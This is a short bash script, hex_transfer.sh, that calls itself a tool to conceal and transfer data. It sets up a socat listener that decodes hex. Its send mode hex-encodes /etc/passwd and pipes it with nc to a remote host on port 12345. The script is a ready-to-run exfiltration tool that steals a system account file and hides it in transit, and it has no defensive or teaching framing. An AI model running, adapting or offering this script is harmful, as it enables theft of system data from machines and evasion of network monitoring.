#!/bin/bash

# hex_transfer.sh - Conceal and transfer data using hex encoding over TCP

# Usage:
#   ./hex_transfer.sh listen               # On the receiving machine
#   ./hex_transfer.sh send <TARGET_IP>     # On the sending machine

PORT=12345

if [[ "$1" == "listen" ]]; then
  echo "[*] Listening on TCP port ${PORT} and decoding hex to ASCII..."
  socat TCP-LISTEN:${PORT},reuseaddr,fork - | xxd -r -p

elif [[ "$1" == "send" && -n "$2" ]]; then
  TARGET="$2"
  echo "[*] Sending /etc/passwd in hex to ${TARGET}:${PORT}..."
  xxd -p /etc/passwd | nc "${TARGET}" "${PORT}"

else
  echo "Usage:"
  echo "  $0 listen"
  echo "  $0 send <TARGET_IP>"
  exit 1
fi
